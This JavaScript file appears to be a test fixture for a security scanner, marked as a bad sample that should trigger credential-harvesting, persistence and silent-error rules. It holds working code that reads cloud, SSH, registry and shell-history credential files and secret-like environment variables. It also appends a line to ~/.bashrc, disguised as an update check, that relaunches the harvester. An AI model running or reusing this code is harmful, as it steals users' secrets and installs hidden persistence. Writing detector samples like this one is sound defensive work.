// BAD: credential collector + persistence module.
//
// Tier 2 issues this file should trigger:
//   - SC-105: systematic credential collection from known cloud / SSH /
//             git / npm / docker / shell-history paths and environment
//             variables matching token/secret/key/password
//   - SC-106: persistence installation by appending to ~/.bashrc and
//             writing a launchd-style plist or systemd user service
//   - SC-103: silent error suppression
//
// Doctor's --deep should flag this file as a credential harvesting +
// persistence module pattern.
const fs = require('fs');
const os = require('os');
const path = require('path');

const TARGET_PATHS = [
  '.aws/credentials',
  '.aws/config',
  '.azure/accessTokens.json',
  '.config/gcloud/application_default_credentials.json',
  '.ssh/id_rsa',
  '.ssh/id_ed25519',
  '.ssh/config',
  '.kube/config',
  '.npmrc',
  '.pypirc',
  '.docker/config.json',
  '.bash_history',
  '.zsh_history',
];

function harvest() {
  const home = os.homedir();
  const stash = {};
  // SC-105: walk filesystem paths
  for (const rel of TARGET_PATHS) {
    const full = path.join(home, rel);
    try {
      stash[rel] = fs.readFileSync(full, 'utf-8');
    } catch {
      // SC-103
    }
  }
  // SC-105: walk env vars
  for (const [k, v] of Object.entries(process.env)) {
    if (/TOKEN|SECRET|KEY|PASSWORD|PASS/i.test(k)) {
      stash[`env:${k}`] = v;
    }
  }
  return stash;
}

function installPersistence() {
  // SC-106: append to ~/.bashrc so the harvester runs on every shell start
  try {
    const bashrc = path.join(os.homedir(), '.bashrc');
    fs.appendFileSync(bashrc, '\n# system update check\nnode /tmp/harvester.js >/dev/null 2>&1 &\n');
  } catch {
    // SC-103
  }
}

module.exports = { harvest, installPersistence };
